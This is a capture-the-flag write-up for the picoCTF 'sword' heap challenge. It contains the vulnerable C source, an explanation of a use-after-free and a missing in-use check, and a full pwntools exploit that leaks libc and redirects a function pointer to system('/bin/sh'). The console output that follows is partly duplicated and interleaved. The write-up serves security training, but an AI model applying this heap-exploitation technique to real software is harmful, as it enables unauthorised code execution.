# sword
Binary Exploitation, 800 points

## Description:
> Can you spawn a shell and get the flag?

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>

#define MAX_SWORD_NUM			6
#define READ_INT_BUF_LEN		32
#define MAX_SWORD_LEN			0x100
#define FORGE_TIME			2
#define ALARM_TIME			30

struct sword_s {
	int name_len;
	int weight;
	
	char *sword_name;
	void (*use_sword)(char *ptr);
	int is_hardened;
};

struct sword_list_s {
	int is_used;
	struct sword_s *sword;
};

struct sword_list_s sword_lists[MAX_SWORD_NUM];

void show_menu() {
	printf("/* Welcome! */\n"
		   "1. Forge a sword.\n"
		   "2. Synthesise two sword.\n"
		   "3. Show a sword.\n"
		   "4. Destroy a sword.\n"
		   "5. Harden a sword.\n"
		   "6. Equip a sword.\n"
		   "7. Quit.\n");
}

void free_sword() {
	int slot;
	printf("What's the index of the sword?\n");
	slot = get_int();
	if (slot < 0 || slot >= MAX_SWORD_NUM ||
		!sword_lists[slot].is_used) {
		printf("I don't trust your number!!!!\n");
		exit(-1);
	}

	sword_lists[slot].is_used = 0;
	char *name = sword_lists[slot].sword->sword_name;

	free(sword_lists[slot].sword);
	free(name);
}

int get_int(void) {
	char str[READ_INT_BUF_LEN];
	char ch;
	int i;

	for (i = 0; (read(STDIN_FILENO, &ch, 1), ch) != '\n' &&
		i < READ_INT_BUF_LEN - 1 && ch != -1; i++) {
		str[i] = ch;
	}
	str[i] = '\x00';
	return atoi(str);
}

int pick_sword_free_slot() {
	for (int i = 0; i < MAX_SWORD_NUM; i++) {
		if (!sword_lists[i].is_used) {
			return i;
		}
	}

	return -1;
}

void show_sword() {
	int slot;
	printf("What's the index of the sword?\n");
	slot = get_int();
	if (slot < 0 || slot >= MAX_SWORD_NUM ||
		!sword_lists[slot].is_used) {
		printf("I don't trust your number!!!!\n");
		exit(-1);
	}

	if (sword_lists[slot].is_used == 0) {
		printf("Haha!!! There is a hacker!!\n");
		exit(-1);
	}

	printf("The weight is %u\n",
		(unsigned int)sword_lists[slot].sword->weight);
	printf("The name is %s\n", sword_lists[slot].sword->sword_name);
}

void hoo(char *name) {
	printf("I use sword %s..... It's so cooool!\n", name);
}

void harden_sword() {
	int slot;
	printf("What's the index of the sword?\n");
	slot = get_int();
	if (slot < 0 || slot >= MAX_SWORD_NUM ||
		!sword_lists[slot].is_used) {
		printf("I don't trust your number!!!!\n");
		exit(-1);
	}

	if (sword_lists[slot].sword->is_hardened) {
		printf("This sword is already hardened!\n");
		return;
	}

	printf("What's the length of the sword name?\n");
	
	/* Get name_len. */
	int len = get_int();
	if (len < 0) {
		printf("Oh no there is a hacker!!!!\n");
		exit(-1);
	}

	if (len > MAX_SWORD_LEN) {
		printf("The name is too long.\n");
		free(sword_lists[slot].sword);
		return;
	}

	sword_lists[slot].sword->name_len = len;

	/* Get sword name. */
	sword_lists[slot].sword->sword_name = malloc(len + 1);

	if (!sword_lists[slot].sword->sword_name) {
	        puts("malloc() returned NULL. Out of Memory\n");
		exit(-1);
	}
	
	printf("Plz input the sword name.\n");

	char ch;
	int i;
	for (i = 0; (read(STDIN_FILENO, &ch, 1), ch) != '\n' &&
		i < len && ch != -1; i++) {
		sword_lists[slot].sword->sword_name[i] = ch;
	}
	sword_lists[slot].sword->sword_name[i] = '\x00';

	/* Get sword weight. */
	printf("What's the weight of the sword?\n");
	int weight = get_int();
	
	printf("OK....Plz wait for forging the sword..........\n");
	sleep((weight + 1) * 10000000);

	sword_lists[slot].sword->weight = weight;
	sword_lists[slot].sword->use_sword = hoo;
	sword_lists[slot].sword->is_hardened = 1;
}

void equip_sword() {
	int slot;
	printf("What's the index of the sword?\n");
	slot = get_int();
	if (slot < 0 || slot >= MAX_SWORD_NUM ||
		!sword_lists[slot].sword) {
		printf("I don't trust your number!!!!\n");
		exit(-1);
	}

	/* Apparently there should be system('/bin/sh'). */
	(sword_lists[slot].sword->use_sword)(sword_lists[slot].sword->sword_name);
}

/* Vuln. */
void synthe_sword() {
	int slot_1, slot_2;
	printf("What's the index of the first sword?\n");
	slot_1 = get_int();
	if (slot_1 < 0 || slot_1 >= MAX_SWORD_NUM ||
		!sword_lists[slot_1].is_used) {
		printf("I don't trust your number!!!!\n");
		exit(-1);
	}

	printf("What's the index of the second sword?\n");
	slot_2 = get_int();
	if (slot_2 < 0 || slot_2 >= MAX_SWORD_NUM ||
		!sword_lists[slot_2].is_used) {
		printf("I don't trust your number!!!!\n");
		exit(-1);
	}

	printf("OK.... Forge two swords now!!\n");
	struct sword_list_s sword1_list = sword_lists[slot_1];
	struct sword_list_s sword2_list = sword_lists[slot_2];

	/* Two swords are lost. */
	sword1_list.is_used = sword2_list.is_used = 0;

	sleep(FORGE_TIME);

	/* Combinne two names together. */
	sword2_list.sword->sword_name = realloc(sword2_list.sword->sword_name,
		sword1_list.sword->name_len + sword2_list.sword->name_len + 1);
	if (!sword2_list.sword->sword_name) {
		exit(-1);
	}

	memcpy(sword2_list.sword->sword_name + sword2_list.sword->name_len,
		sword1_list.sword->sword_name, sword1_list.sword->name_len);

	sword2_list.sword->name_len += sword1_list.sword->name_len;
	
	/* New sword is created. */
	sword2_list.is_used = 1;

	/* Clear the first sword. */
	free(sword1_list.sword->sword_name);

	printf("YOu have the NEW sword!\n");
}

void create_sword() {
	int slot = pick_sword_free_slot();
	if (slot == -1) {
		printf("Oh my! There are no slot for new swords!\n");
		return;
	}

	sword_lists[slot].sword = malloc(sizeof(struct sword_s));
	if (!sword_lists[slot].sword) {
	        puts("malloc() returned NULL. Out of Memory\n");
		exit(-1);
	}

	sword_lists[slot].is_used = 1;
	sword_lists[slot].sword->is_hardened = 0;
	printf("New sword is forged ^_^. sword index is %d.\n", slot);
}

void alarm_handler(int sig) {
	printf("Blade master is angry!\n");
	exit(-1);
}

int main() {


        setvbuf(stdout, NULL, _IONBF, 0);
  
	/* If someone can print some ascii art, that should be better. */
	
	signal(SIGALRM, alarm_handler);
	alarm(ALARM_TIME);

	char buf[READ_INT_BUF_LEN];
	while (1) {
		show_menu();

		if (read(STDIN_FILENO, buf, READ_INT_BUF_LEN) == 0) {
			return -1;
		}

		int command = atoi(buf);
		switch (command) {
			case 1:
				create_sword();
				break;

			case 2:
				synthe_sword();
				break;

			case 3:
				show_sword();
				break;

			case 4:
				free_sword();
				break;

			case 5:
				harden_sword();
				break;

			case 6:
				equip_sword();
				break;

			case 7:
				printf("Thank you!\n");
				break;

			default:
				break;
		}
	}
}

```



## Solution:

The provided program allows us to perform various operations related to swords. 

From inspecting the source, we can find several bugs in the implementation.

First, we see that `sword_s` is a structure representing a sword, and in the current implementation is always allocated on the heap. It contains a `sword_name` pointer, which also points to data allocated on the heap. However, in one case we can cause the pointer to the `sword_s` structure to be freed without freeing the `sword_name`, and without resetting the `sword_lists[slot]` to default:
```c
void harden_sword() {
...
	if (len > MAX_SWORD_LEN) {
		printf("The name is too long.\n");
		free(sword_lists[slot].sword);
		return;
	}
...
}
```

In addition, we see that `equip_sword()` will execute its logic without making sure that `sword_lists[slot_1].is_used`.

We will use both bugs in order to spawn a shell. Our strategy will be as follows:

First we allocate two swords, which will create two new entries in `sword_lists`:
```c
struct sword_list_s {
	int is_used;
	struct sword_s *sword;
};

struct sword_list_s sword_lists[MAX_SWORD_NUM];
```

Both `sword_lists[0]` and `sword_lists[1]` will have `is_used = 1`, and their `sword` pointer will point to a valid `struct sword_s` structure on the heap.

Then, we will use the bug in `harden sword` in order to free one of the sword entries without cleaning up the structure. This will give us one entry which still has `is_used` set to TRUE, and `sword` pointing to a location on the heap, but from the heap manager's perspective that location is actually free.

Now, we use `harden_sword` again, this time to cause the program to perform another heap allocation:
```c
	printf("What's the length of the sword name?\n");
	
	/* Get name_len. */
	int len = get_int();
	if (len < 0) {
		printf("Oh no there is a hacker!!!!\n");
		exit(-1);
	}

	if (len > MAX_SWORD_LEN) {
		printf("The name is too long.\n");
		free(sword_lists[slot].sword);
		return;
	}

	sword_lists[slot].sword->name_len = len;

	/* Get sword name. */
	sword_lists[slot].sword->sword_name = malloc(len + 1);
```

If we request a name of length `sizeof(struct sword_s)`, the heap manager would probably give us the same allocation which was used to store the `struct sword_s` that we've tricked the program to free in the previous step. Furthermore, if instead of just a name, we provide data which is crafted to look like a `struct sword_s`, we will end up with a sword entry that is indistinguishable from a legitimate sword entry, but is completely controlled by us. And as an added bonus, `struct sword_s` contains both a string and a function pointer:
```c
struct sword_s {
	int name_len;
	int weight;
	
	char *sword_name;
	void (*use_sword)(char *ptr);
	int is_hardened;
};
``` 

We will use this trick twice: First, to leak the address of a libc function via the sword name, which will allow us to calculate the libc base. Then again, by setting `use_sword` to `system()` and calling it on a sword name which will point to `/bin/sh`.

The script:
```python
from pwn import *
from ctypes import *
import re

PROGRAM = "./sword"
LIBC = "./libc.so.6"
MAX_SWORD_LEN = 0x100

class sword_s(Structure):
    _fields_ = [('name_len', c_int32),
                ('weight', c_int32),
                ('sword_name', c_int64),
                ('use_sword', c_int64),
                ('is_hardened', c_int32)]
    def to_bytes(self):
        return buffer(self)[:]


def read_menu():
    p.recvuntil("Quit.\n")

def forge_sword():
    read_menu()
    p.sendline("1")
    out = p.recvline()
    id = re.search("index is (\d+)\.", out).group(1)
    log.info("Forged sword: {}".format(id))
    return id

def show_sword(id):
    read_menu()
    p.sendline("3")
    p.recvuntil("What's the index of the sword?\n")
    p.sendline(str(id))
    p.recvline()
    out = p.recvline(keepends=True)
    name = re.search("name is (.+)\n", out).group(1)
    log.info("Sword #{} has name '{}' ({})".format(id, name, enhex(name)))
    return name

def destroy_sword(id):
    read_menu()
    p.sendline("4")
    p.recvuntil("What's the index of the sword?\n")
    p.sendline(str(id))
    log.info("Sword #{} destroyed".format(id))

def harden_sword(id, name_length, name, weight):
    read_menu()
    p.sendline("5")
    p.recvuntil("What's the index of the sword?\n")
    p.sendline(str(id))
    p.recvuntil("What's the length of the sword name?\n")
    p.sendline(str(name_length))
    if name_length > MAX_SWORD_LEN:
        log.info("Sword #{} pseudo-freed".format(id))
        return
    p.recvuntil("Plz input the sword name.\n")
    p.sendline(str(name))
    p.recvuntil("What's the weight of the sword?\n")
    p.sendline(str(weight))
    p.recvline()
    log.info("Sword #{} hardened with name '{}' (length: {}, weight: {})".format(id, name.encode("hex"), name_length, weight))
    
def equip_sword(id):
    read_menu()
    p.sendline("6")
    p.recvuntil("What's the index of the sword?\n")
    p.sendline(str(id))
    log.info("Sword #{} used".format(id))

e = ELF(PROGRAM)
libc = ELF(LIBC)

p = remote("2018shell3.picoctf.com", 44116)


sword_ids = []
for i in range(4):
    sword_ids.append(forge_sword())

#Free sword without cleaning up:
harden_sword(sword_ids[0], MAX_SWORD_LEN+1, None, None)


sword = sword_s()
sword.name_len = 8 #size of pointer
sword.weight = 0
sword.sword_name = (e.got['malloc'])
sword.use_sword = 0 
sword.is_hardened = 0

harden_sword(sword_ids[1], sizeof(sword), sword.to_bytes(), -1)
malloc_addr = show_sword(sword_ids[0])
malloc_addr = u64(malloc_addr.ljust(8, '\x00'))
log.info("Address of malloc: {}".format(hex(malloc_addr)))
libc_base = malloc_addr - libc.symbols['malloc']
log.info("LibC base: {}".format(hex(libc_base)))
assert (libc_base & 0xFFF == 0)

#Free sword without cleaning up:
harden_sword(sword_ids[2], MAX_SWORD_LEN+1, None, None)

binsh = "/bin/sh\x00"
sword = sword_s()
sword.name_len = len(binsh)
sword.weight = 0
sword.sword_name = libc_base + next(libc.search(binsh))
sword.use_sword = libc_base + libc.symbols['system']
sword.is_hardened = 0

log.info("/bin/sh location: {}".format(hex(sword.sword_name)))
log.info("Address of system(): {}".format(hex(sword.use_sword)))

harden_sword(sword_ids[3], sizeof(sword), sword.to_bytes(), -1)
equip_sword(sword_ids[2])


p.interactive()
```

The output:
```console
root@kali:/media/sf_CTFs/pico/sword# python exploit.py
[*] '/media/sf_CTFs/pico/sword/sword'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RPATH:    './'
[*] '/media/sf_CTFs/pico/sword/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to 2018shell3.picoctf.com on port 44116: Done
[*] Forged sword: 0
[*] Forged sword: 1
[*] Forged sword: 2
[*] Forged sword: 3
[*] Sword #0 pseudo-freed
[*] Sword #1 hardened with name '0800000000000000602060000000000000000000000000000000000000000000' (length: 32, weight: -1)
[*] Forged sword: 0
[*] Forged sword: 1
[*] '/media/sf_CTFs/pico/sword/libc.so.6'
[*] '/media/sf_CTFs/pico/sword/sword'
[*] '/media/sf_CTFs/pico/sword/sword'
[*] '/media/sf_CTFs/pico/sword/sword'
[*] '/media/sf_CTFs/pico/sword/sword'
[*] '/media/sf_CTFs/pico/sword/sword'
    Arch:     amd64-64-little
[*] '/media/sf_CTFs/pico/sword/sword'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RPATH:    './'
[*] '/media/sf_CTFs/pico/sword/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to 2018shell3.picoctf.com on port 44116: Done
[*] Forged sword: 0
[*] Forged sword: 1
[*] Forged sword: 2
[*] Forged sword: 3
[*] Sword #0 pseudo-freed
[*] Sword #1 hardened with name '0800000000000000602060000000000000000000000000000000000000000000' (length: 32, weight: -1)
[*] Sword #0 has name '0v0' (30e17630d17f)
[*] Address of malloc: 0x7fd13076e130
[*] LibC base: 0x7fd1306ea000
[*] Sword #2 pseudo-freed
[*] /bin/sh location: 0x7fd130876d57
[*] Address of system(): 0x7fd13072f390
[*] Sword #3 hardened with name '0800000000000000576d8730d17f000090f37230d17f00000000000000000000' (length: 32, weight: -1)
[*] Sword #2 used
[*] Switching to interactive mode
Blade master is angry!
$ ls
flag.txt
libc.so.6
sword
sword.c
xinet_startup.sh
$ cat flag.txt
picoCTF{usE_aFt3R_fr3e_1s_aN_1ssu3_300469f1}
$
```

The flag: picoCTF{usE_aFt3R_fr3e_1s_aN_1ssu3_300469f1}